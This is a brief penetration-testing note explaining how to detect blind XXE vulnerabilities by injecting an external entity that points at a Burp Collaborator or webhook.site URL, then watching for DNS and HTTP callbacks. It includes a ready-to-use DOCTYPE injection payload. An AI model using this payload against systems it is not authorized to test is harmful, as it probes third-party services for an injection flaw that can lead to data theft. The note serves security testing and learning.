You can detect XXE vulnerability blind through making requests to another domain - this can be done with either webhooks.site or burp collaborator.


If you find a request sending xml:
Open collaborator/webhooks and obtain your unique url
Insert the following external entity definition after the xml declaration:
`<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://UNIQUE_URL_HERE"> ]>`
Sometime you may need to replace a value with reference to the external entity: `&xxe;`
Go to your webhooks/collaborator window. You should see some DNS and HTTP interactions.
